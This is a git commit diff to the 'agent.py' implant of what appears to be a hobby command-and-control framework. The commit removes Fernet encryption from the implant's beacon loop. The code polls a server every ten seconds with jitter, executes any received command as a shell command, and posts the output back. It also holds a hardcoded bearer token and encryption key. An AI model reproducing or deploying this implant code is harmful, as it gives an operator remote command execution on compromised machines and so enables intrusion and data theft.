f659886e222ca2b13572d6dc1d3025c6803fa08b
vasilismanthelas2004 <vasilismanthelas2004@gmail.com>
2026-02-22 18:47:21 +0200

    Update agent.py
    remove encryption

--- c2_framework/implant/agent.py
+++ c2_framework/implant/agent.py
@@ -1,13 +1,9 @@
 import requests, time, subprocess, socket, random, uuid
-from cryptography.fernet import Fernet
 
 SERVER_URL = "http://127.0.0.1:5000"
-AGENT_ID = f"test_agent_01"#"agent_{uuid.getnode()}"
+AGENT_ID = f"agent_{uuid.getnode()}"
 HOSTNAME = socket.gethostname()
 HEADERS = {"Authorization": "Bearer super_secret_c2_token_2026"}
-
-# PASTE YOUR GENERATED KEY BELOW:
-CIPHER = Fernet(b'HWM_K4hduFt_o_OxpTkirD2pyVZ_OvsH-xlAWkggzUQ=') 
 
 def register():
     try:
@@ -23,10 +19,9 @@ def beacon():
             response = requests.get(f"{SERVER_URL}/api/tasks/{AGENT_ID}", headers=HEADERS)
             if response.status_code == 200:
                 data = response.json()
-                enc_command = data.get("command")
+                command = data.get("command")
                 
-                if enc_command and enc_command != "sleep":
-                    command = CIPHER.decrypt(enc_command.encode()).decode()
+                if command and command != "sleep":
                     print(f"[*] Executing: {command}")
                     
                     try:
@@ -36,8 +31,7 @@ def beacon():
                     except Exception as e:
                         output = str(e)
                         
-                    enc_output = CIPHER.encrypt(output.encode()).decode()
-                    requests.post(f"{SERVER_URL}/api/results", json={"task_id": data.get("task_id"), "output": enc_output}, headers=HEADERS)
+                    requests.post(f"{SERVER_URL}/api/results", json={"task_id": data.get("task_id"), "output": output}, headers=HEADERS)
         except: pass
         
         time.sleep(10 + random.uniform(-2, 2)) # 10 sec sleep + jitter
